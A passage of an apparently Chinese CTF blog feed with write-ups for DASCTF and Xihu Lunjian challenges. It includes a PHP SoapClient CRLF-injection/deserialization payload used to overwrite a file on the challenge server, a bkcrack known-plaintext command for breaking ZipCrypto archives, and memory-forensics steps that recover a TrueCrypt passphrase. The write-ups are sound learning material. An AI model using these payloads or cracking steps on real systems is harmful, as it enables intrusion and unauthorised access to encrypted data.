0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--229aafba818c5da83cd0547a3a0002d5--\r\n&quot;</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;Enterpr1se\r\n&quot;</span> . <span class="hljs-string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$postdata</span>,<span class="hljs-number">2</span>,<span class="hljs-number">32</span>).<span class="hljs-string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>.<span class="hljs-variable">$postdata</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (SoapFault <span class="hljs-variable">$e</span>) &#123;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<br><span class="hljs-variable">$b</span>-&gt;koi=[<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;nnnnn&quot;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>传参，这里注意get也要传，否则不传post的数据</p><figure><img src="/img/2023DASCTF-11/170264599166817.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再次访问index.php，成功覆盖</p><figure><img src="/img/2023DASCTF-11/170264599166818.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>cat /flag</code>即可</p><p>参考</p><p>https://fdlucifer.github.io/2023/07/01/2023-chunqiubei-spring-php-again/https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/https://www.vuln.cn/6763</p><h2 id="realrce">realrce</h2><p>原型链还不太熟，总结完再回来看吧，挖个坑</p><h1 id="misc">MISC</h1><h2 id="icetea">IceTea</h2><p>流量包，抓第一个shell.php，有一串hex</p><figure><img src="/img/2023DASCTF-11/170264599166819.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>转一下看到ELF头</p><figure><img src="/img/2023DASCTF-11/170264599166820.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ida打开看到有base64换表的表（正常是<code>A-Za-z0-9+/=</code>）</p><figure><img src="/img/2023DASCTF-11/170264599166821.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看每一个流的操作，base64解密一下，<code>./ezbase e flag.txt IceTea.txt</code>可以看出用了ezbase这个程序（也就是刚刚拿到的elf加密了flag.txt），然后再<code>cat flag.txt</code>，那就看这个cat的流</p><figure><img src="/img/2023DASCTF-11/170264599166822.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看第四个流的response信息，就是加密后的flag.txt信息，base64解一下</p><figure><img src="/img/2023DASCTF-11/170264599166823.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>解出来的这一串再base64换表，得到flag，<code>DASCTF&#123;Ice_tea_is_not_a_loser_drink!&#125;</code></p><figure><img src="/img/2023DASCTF-11/170264599166824.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>题目不难，出的也还可以</p><h2 id="拼拼凑凑">拼拼凑凑</h2><p>ppcc目录下有1296张小图片，像素为40<em>40，首先想到用montage+gaps拼图为36</em>36的大图</p><p>一套下来得到这两张图，显然不太成功</p><figure><img src="/img/2023DASCTF-11/170264599166825.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这张图已经能大概看出图的样子了，但是没什么用</p><figure><img src="/img/2023DASCTF-11/170264599166826.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看png，尾部还有很多数据，但是确实看不出是什么</p><figure><img src="/img/2023DASCTF-11/170264599166827.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看了wp，真脑洞，最后两个数是坐标，写脚本提取一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment">#文件名到位置的映射</span><br>file_name_to_position  = &#123;&#125;<br><span class="hljs-comment">#png文件列表</span><br>png_files = os.listdir(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>)<br><span class="hljs-comment">#png_files.remove(&#x27;de.py&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> png_files:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+i,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        location_data = f.read()[-<span class="hljs-number">2</span>:]<br>        location_x,location_y = location_data[<span class="hljs-number">0</span>],location_data[<span class="hljs-number">1</span>]  <span class="hljs-comment">#自动转成10进制数</span><br><br>        file_name_to_position[i] = (location_x, location_y)<br><br><span class="hljs-comment">#根据映射排列png</span><br>sorted_png_files = <span class="hljs-built_in">sorted</span>(png_files, key=<span class="hljs-keyword">lambda</span> filename: file_name_to_position[filename])<br><br><span class="hljs-comment">#每个小png的长宽</span><br>png_width,png_height = <span class="hljs-number">40</span>, <span class="hljs-number">40</span><br><br><span class="hljs-comment">#创建背景图像</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (png_width*<span class="hljs-number">48</span>, png_width*<span class="hljs-number">27</span>), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br><br><span class="hljs-keyword">for</span> i, filename <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sorted_png_files):<br>    <span class="hljs-comment"># 读取小图像</span><br>    tile = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename)<br>    <span class="hljs-comment"># 计算小图像在目标图像中的位置</span><br>    x = (i % <span class="hljs-number">48</span>) * png_width<br>    y = (i // <span class="hljs-number">48</span>) * png_height<br>    <span class="hljs-comment"># 将小图像粘贴到目标图像中</span><br>    img.paste(tile, (x, y))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Pasting <span class="hljs-subst">&#123;filename&#125;</span> at position (<span class="hljs-subst">&#123;x&#125;</span>, <span class="hljs-subst">&#123;y&#125;</span>)&quot;</span>)<br>    <br><span class="hljs-comment">#保存为re.png </span><br>img.save(<span class="hljs-string">&#x27;res.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到原图</p><figure><img src="/img/2023DASCTF-11/170264599166828.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里又是一个比较难找的地方，在图片的左下角有一个像素条，用ps看</p><figure><img src="/img/2023DASCTF-11/170264599166929.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023DASCTF-11/170264599166930.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>发现rgb为5的倍数，将300-362的像素除50后5进制转字符串(?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 打开包含像素数据的图像</span><br>image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.png&quot;</span>)<br>key=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 初始化一个空列表来存储像素颜色值</span><br>pixel_colors = []<br><br><span class="hljs-comment"># 读取x坐标为300-362，y坐标为800的像素条像素值</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>,<span class="hljs-number">363</span>):<br>    pixel_color = image.getpixel((x, <span class="hljs-number">800</span>))[<span class="hljs-number">0</span>]//<span class="hljs-number">50</span><br>    pixel_colors.append(pixel_color)<br><br>group = []<br><span class="hljs-comment">#五进制转字符</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pixel_colors:<br>    group.append(<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(group)<br>    <span class="hljs-comment"># 每三个数字代表一个字符</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(group) == <span class="hljs-number">3</span>:<br>        current_num = <span class="hljs-number">0</span><br>        power = <span class="hljs-number">2</span>  <span class="hljs-comment"># 修改初始幂值为2</span><br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> group:<br>            current_num += <span class="hljs-built_in">int</span>(d) * (<span class="hljs-number">5</span> ** power)<br>            power -= <span class="hljs-number">1</span><br>        key += <span class="hljs-built_in">chr</span>(current_num)<br>        group = []<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#Th1s_1s_k4y_0f_s3cr3t</span><br></code></pre></td></tr></table></figure><p>拿到key，<code>Th1s_1s_k4y_0f_s3cr3t</code></p><p>拿到key有什么用呢，想到刚刚png里多出来的尾部字节</p><p>提取出来拼在一起（脚本照抄了，最后一张图字节数还不一样，这题出的...）</p><p>修改后最终的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment">#文件名到位置的映射</span><br>file_name_to_position  = &#123;&#125;<br><span class="hljs-comment">#png文件列表</span><br>png_files = os.listdir(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>)<br><span class="hljs-comment">#png_files.remove(&#x27;de.py&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> png_files:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+i,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        location_data = f.read()[-<span class="hljs-number">2</span>:]<br>        location_x,location_y = location_data[<span class="hljs-number">0</span>],location_data[<span class="hljs-number">1</span>]  <span class="hljs-comment">#自动转成10进制数</span><br><br>        file_name_to_position[i] = (location_x, location_y)<br><br><span class="hljs-comment">#根据映射排列png</span><br>sorted_png_files = <span class="hljs-built_in">sorted</span>(png_files, key=<span class="hljs-keyword">lambda</span> filename: file_name_to_position[filename])<br><br><span class="hljs-comment">#每个小png的长宽</span><br>png_width,png_height = <span class="hljs-number">40</span>, <span class="hljs-number">40</span><br><br><span class="hljs-comment">#创建背景图像</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (png_width*<span class="hljs-number">48</span>, png_width*<span class="hljs-number">27</span>), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br><br>appended_data = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i, filename <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sorted_png_files):<br>    <span class="hljs-comment"># 读取小图像</span><br>    tile = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename)<br>    <span class="hljs-comment"># 计算小图像在目标图像中的位置</span><br>    x = (i % <span class="hljs-number">48</span>) * png_width<br>    y = (i // <span class="hljs-number">48</span>) * png_height<br>    <span class="hljs-comment"># 将小图像粘贴到目标图像中</span><br>    img.paste(tile, (x, y))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Pasting <span class="hljs-subst">&#123;filename&#125;</span> at position (<span class="hljs-subst">&#123;x&#125;</span>, <span class="hljs-subst">&#123;y&#125;</span>)&quot;</span>)<br>    <br>    <br>    <span class="hljs-comment"># 读取图像文件的二进制数据</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        image_data = file.read()<br>    <span class="hljs-comment"># 根据位置信息选择要拼接的字节范围</span><br>    <span class="hljs-keyword">if</span> file_name_to_position[filename] == (<span class="hljs-number">47</span>, <span class="hljs-number">26</span>):<br>        appended_data += image_data[-<span class="hljs-number">923</span>:-<span class="hljs-number">921</span>]  <span class="hljs-comment"># 对最后一个文件拼接不同大小的字节范围</span><br>    <span class="hljs-keyword">else</span>:<br>        appended_data += image_data[-<span class="hljs-number">811</span>:-<span class="hljs-number">2</span>]  <span class="hljs-comment"># 对其他文件拼接固定大小的字节范围</span><br>        <br>        <br><span class="hljs-comment"># 将拼接好的数据保存为res文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> res_file:<br>    res_file.write(appended_data)<br>    <br><span class="hljs-comment">#保存为re.png </span><br>img.save(<span class="hljs-string">&#x27;res.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到res，有Th1s_1s_k4y_0f_s3cr3t猜想是veracrypt，直接password还不行，要加上png为keyfile</p><figure><img src="/img/2023DASCTF-11/170264599166931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到flag.txt</p><figure><img src="/img/2023DASCTF-11/170264599166932.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>(真脑洞，怪不得0解)</p><h2 id="ez_forensics">ez_forensics</h2><blockquote><p>近日，警方破获了一起串通招投标案，控制了相关嫌疑人，并对所有计算机进行了现场取证，获取到了磁盘和内存镜像（附件1，MD5值de7f245743f96721a68ca8ad3355d081）。在后期的勘验工作中，警方在公司财务的计算机磁盘镜像中提取了一个可疑文件（附件2，MD5值e4a9669e7545647aa8921ac06421aaec）。根据抓获的其他嫌疑人供述，该财务掌握有一份其通过购买黑客服务获取到的专家名单，并且拥有非常强的加密，但公司财务拒不交代其加密方式及密码，并对以上供述表示否定，称不知道有加密的存在，更不知道专家名单的事。现要求你对该提取出来的可疑文件及内存镜像进行勘验，尝试解析其内容，并提取其中的专家名单，计算其小写MD5值作为flag提交（格式要求：DASCTF{小写MD5值}）。</p></blockquote><p>附件1是内存镜像，用vol分析一下</p><p>imageinfo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure><p>pslist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-number">0xfffffa80023ee060</span> TrueCrypt.exe          <span class="hljs-number">2820</span>   <span class="hljs-number">2464</span>      <span class="hljs-number">4</span>      <span class="hljs-number">212</span>      <span class="hljs-number">1</span>      <span class="hljs-number">1</span> <span class="hljs-number">2023</span>-09-<span class="hljs-number">19</span> <span class="hljs-number">14</span>:09:<span class="hljs-number">32</span> UTC+<span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>看到有TrueCrypt，猜测附件2为TrueCrypt加密的卷</p><p>filescan</p><figure><img src="/img/2023DASCTF-11/170264599166933.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>truecryptpassphrase</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Found at <span class="hljs-number">0xfffff88004298ee4</span> length <span class="hljs-number">16</span>: CZYWS_s4zyd_User<br></code></pre></td></tr></table></figure><p>拿到密码，VeraCrypt挂载，因为是用TrueCrypt加密的，选<code>TrueCrypt Mode</code>，</p><figure><img src="/img/2023DASCTF-11/170264599166934.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到文件名为ECB的乱码文件</p><p>用刚刚的key：<code>CZYWS_s4zyd_User</code>解密ECB得到提示</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Do you know how <span class="hljs-built_in">to</span> <span class="hljs-built_in">decrypt</span> <span class="hljs-keyword">a</span> hidden volume <span class="hljs-keyword">by</span> this decrypted <span class="hljs-built_in">file</span>?<br></code></pre></td></tr></table></figure><figure><img src="/img/2023DASCTF-11/170264599166935.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据提示将<code>Do you know how to decrypt a hidden volume by this decrypted file?</code>写入文件并保存</p><p>然后VeraCrypt使用keyfile挂载即可得到隐藏卷</p><figure><img src="/img/2023DASCTF-11/170264599166936.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据题目计算md5值</p><figure><img src="/img/2023DASCTF-11/170264599166937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最终flag，DASCTF{c2c68e18fa4f01a4877a586104e7c721}</p><p>(这题出的不错)</p><h1 id="总结">总结</h1><p>题目出的质量还是很高的，能学到新东西，感谢Opsu3的师傅们</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022西湖论剑MISC复现</title>
    <link href="/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑misc复现">2022西湖论剑MISC复现</h1><p>强网杯快开始了，想着复现一下取证和misc的题目，刚好2022西湖论剑都有，而且难度也挺高</p><h1 id="misc">MISC</h1><h2 id="mp3"><strong>mp3</strong></h2><p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p><figure><img src="/img/2022西湖论剑MISC复现/170134897029315.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看到有个png，foremost分离一下</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702651.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到只有黑白像素的png图片</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702662.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>按行转成010的二进制值然后再转成16进制数保存为文件看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from PIL import Image<br>import struct<br><br>img = Image.open(<span class="hljs-string">&#x27;00000646.png&#x27;</span>)<br>width, height = img.size<br><br>f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#按行读取</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(width):<br>        flag += str(img.getpixel((x, y))//255)  <span class="hljs-comment">#255//255 = 1 ; 0//255 = 0</span><br><span class="hljs-comment">#print(flag)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(flag), 8):<br>    f.write(struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, int(flag[i:i+8], 2)))<br>f.close()<br></code></pre></td></tr></table></figure><p><code>50 4B 03 04</code>拿到zip，里面有个加密的47.txt</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702663.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试了一下不是伪加密，回到mp3stego，无密码直接解密得到压缩包密码<code>8750d5109208213f</code></p><figure><img src="/img/2022西湖论剑MISC复现/17013489702664.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到47.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj<br></code></pre></td></tr></table></figure><p>由47联想到rot47</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702665.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>类似jjencode，console直接解得到flag：DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702666.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="take_the_zip_easy">take_the_zip_easy</h2><p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04</code></p><p>尝试明文攻击</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026613.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>bkcrack.exe -C zipeasy.zip -x 30 646173666C6F772E706361706E67 -x 0 504B0304 -c dasflow.zip</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> <span class="hljs-number">1</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span><span class="hljs-meta"></span><br><span class="hljs-meta">[19:36:43] Z reduction using 6 bytes of known plaintext</span><br><span class="hljs-meta">100.0 % (6 / 6)</span><br><span class="hljs-meta">[19:36:43] Attack on 1038290 Z values at index 37</span><br><span class="hljs-meta">Keys: 2b7d78f3 0ebcabad a069728c</span><br><span class="hljs-meta">67.7 % (703384 / 1038290)</span><br><span class="hljs-meta">[19:41:03] Keys</span><br><span class="hljs-meta">2b7d78f3 0ebcabad a069728c</span><br></code></pre></td></tr></table></figure><p><code>bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code></p><p>得到dasflow.zip，解压得到dasflow.pcapng</p><p>简单看看，比较明显是哥斯拉流量，里面还有个flag.zip，<code>stream 6</code>里有原始的webshell，可以看到key为<code>d8ea7326e6ec5916</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 